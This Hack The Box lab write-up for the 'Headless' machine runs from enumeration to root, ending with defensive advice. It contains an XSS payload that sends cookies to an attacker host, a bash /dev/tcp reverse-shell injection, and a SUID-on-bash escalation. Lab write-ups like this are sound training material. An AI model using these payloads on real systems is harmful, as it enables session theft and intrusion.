# HTB - Headless

**IP Address:** `10.10.11.8`  
**OS:** Linux  
**Difficulty:** Easy  
**Tags:** #XSS, #CookieHijacking, #BurpSuite, #ReverseShell, #SUID, #PrivilegeEscalation

---
## Synopsis

Headless is an easy Linux machine that demonstrates web exploitation and privilege escalation techniques.  
The attack path involves exploiting a **reflected XSS** vulnerability to steal an admin cookie, leveraging it to access the dashboard, and then injecting a **reverse shell** via command injection.  
Privilege escalation is achieved by abusing a misconfigured **syscheck** script, which executes a user-controlled file as `root`.

---
## Skills Required

- Basic web enumeration  
- Knowledge of **XSS exploitation**  
- Understanding of **reverse shell payloads**  
- Familiarity with **Linux privilege escalation techniques**

## Skills Learned

- Stealing cookies using XSS payloads  
- Gaining access via cookie impersonation  
- Executing a reverse shell through URL encoding  
- Abusing misconfigured scripts for privilege escalation  

---
## 1. Initial Enumeration

### 1.1 Connectivity Test

Check if the host is alive using ICMP:

```bash
ping -c 1 10.10.11.8
```

![[GitHub Documentation/EASY/HTB_Headless_Writeup/screenshots/ping.png]]

The host responds, confirming it is reachable.

---
### 1.2 Port Scanning

Scan all TCP ports to identify running services:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.8 -oG allPorts
```

- `-p-`: Scan all 65,535 ports  
- `--open`: Show only open ports  
- `-sS`: SYN scan  
- `--min-rate 5000`: Increase speed  
- `-Pn`: Skip host discovery (already confirmed alive)  
- `-oG`: Output in grepable format

![[GitHub Documentation/EASY/HTB_Headless_Writeup/screenshots/allports.png]]

Extract open ports:

```bash
extractPorts allPorts
```

![[GitHub Documentation/EASY/HTB_Headless_Writeup/screenshots/extractports.png]]

---
### 1.3 Targeted Scan

Run a deeper scan with service/version detection and default scripts:

```bash
nmap -sCV -p22,5000 10.10.11.8 -oN targeted
```

- `-sC`: Run default NSE scripts  
- `-sV`: Detect service versions  
- `-oN`: Output in human-readable format  

Let's check the result:

```bash
cat targeted
```

![[GitHub Documentation/EASY/HTB_Headless_Writeup/screenshots/targeted.png]]

**Findings:**

| Port | Service | Version/Description |
|------|---------|---------------------|
| 22   | SSH     | OpenSSH             |
| 5000 | HTTP    | Werkzeug httpd (Python) |

---
## 2. Web Enumeration

Identify web technologies:

```bash
whatweb http://10.10.11.8:5000
```

![[GitHub Documentation/EASY/HTB_Headless_Writeup/screenshots/whatweb.png]]

Accessing the site shows a landing page:

![[GitHub Documentation/EASY/HTB_Headless_Writeup/screenshots/web.png]]

The only available option is the **For Questions** button, which redirects us... to a support form:

![[web_support.png]]

When filling it in and tap in *submit*, the page refreshes and clears the fields.  
We are in `/support`, so we proceed with **directory brute forcing**:

```bash
gobuster dir -u http://10.10.11.8:5000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
```

![[gobuster.png]]

We discover `/support` and `/dashboard`.  
However, `/dashboard` returns **401 Unauthorized**:

![[dashboard_unauthorised.png]]

The `whatweb` results also revealed the cookie `is_admin`, suggesting privilege-based access.  

---
## 3. Exploitation

### 3.1 XSS Discovery

Intercepting the support form request with BurpSuite:

![[bs_dashboard.png]]

Nothing interesting. Let´s see if there are XSS vulnerabilities filling the form like:

![[support_xss.png]]

After tap on **submit**:

![[support_hacking_attempt.png]]

Seems that our info has been sent to support team to analyze the hacking attempt detected. Probably, if we intercept this request, we can see where this info is going and steal the receiver’s session cookie.

Intercepting the request:

![[bs_support_original.png]]  

Let's test for **XSS injection** by modifying the **User-Agent** with payload:

```html
<script>alert(0);</script>
```

![[bs_support_script.png]]

The alert executes successfully:

![[xss_vulnerability_detected.png]]

Thus, the application is vulnerable to **XSS**.

---
### 3.2 Cookie Stealing via XSS

We can steal the admin’s session cookie with the following payload:

```html
<script>var i=new Image(); i.src="http://10.10.14.7/?cookie=" + document.cookie</script>
```

![[bs_sending_cookie.png]]

Start a Python server and wait for incoming requests:

![[cookies_receive.png]]

We receive two cookies:
- Our own session
- An **admin session** cookie

```
InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```

We replace our cookie in the browser with the admin’s:

![[admin_dashboard.png]]

We now have access to the Dashboard.

---
### 3.3 Reverse Shell Injection

On the dashboard, selecting *Generate Report* sends a request with a `date` parameter:

![[admin_dashboard_generate_report.png]]  
![[bs_generate_report_original.png]]

Open a Netcat listener:

```bash
nc -nlvp 443
```

Inject a reverse shell in the `date` parameter:

```bash
date=2023-09-15; bash -c "bash -i >& /dev/tcp/10.10.14.7/443 0>&1"
```

![[bs_generate_report_edit_date.png]]

As requests are URL encoded, we must encode the payload:

![[bs_generate_report_encode_date.png]]

This time, the reverse shell connects:

![[GitHub Documentation/EASY/HTB_Headless_Writeup/screenshots/user_flag.png]]

✅ **User flag obtained**

---
## 4. Privilege Escalation

### 4.1 Checking Sudo Rights

List sudo privileges:

```bash
sudo -l
```

![[dvir_files_to_execute.png]]

We can run `/usr/bin/syscheck` as root without a password.

### 4.2 Analyzing the Script

View its content:

```bash
cat /usr/bin/syscheck
```

![[file_to_execute.png]]

Running as sudo:

```bash
sudo /usr/bin/syscheck
```

![[executing_file.png]]

At the end, it executes `initdb.sh` if not already running.  

This is exploitable because we can create our own malicious initdb.sh

### 4.3 Exploit `initdb.sh`

Check current bash permissions:

```bash
ls -l /bin/bash
```

![[bash_permissions_root_nok.png]]

Create a malicious script that sets the SUID bit on `/bin/bash`:

```bash
chmod u+s /bin/bash
```

![[changing_permissions.png]]

Run `syscheck` again:

```bash
sudo /usr/bin/syscheck
ls -l /bin/bash
```

![[bash_permissions_root_ok.png]]

Now `/bin/bash` has the SUID bit set, allowing us to spawn a root shell:

![[GitHub Documentation/EASY/HTB_Headless_Writeup/screenshots/root_flag.png]]

✅ **Root flag obtained**

---
# ✅ MACHINE COMPLETE

---
## Summary of Exploitation Path

1. **Web Enumeration** → Identified `/support` and `/dashboard`.  
2. **XSS** → Injected script to steal the admin cookie.  
3. **Session Hijacking** → Used stolen cookie to access `/dashboard`.  
4. **Reverse Shell Injection** → Exploited the `date` parameter to gain user access.  
5. **Privilege Escalation** → Abused `syscheck` script and replaced `initdb.sh` to escalate to root.

---
## Defensive Recommendations

- Sanitize user input to prevent **XSS vulnerabilities**.  
- Store session tokens securely (e.g., HttpOnly cookies).  
- Validate and sanitize parameters before execution to prevent **command injection**.  
- Restrict and properly configure scripts executed with `sudo`.  
- Regularly audit custom scripts for privilege escalation risks.
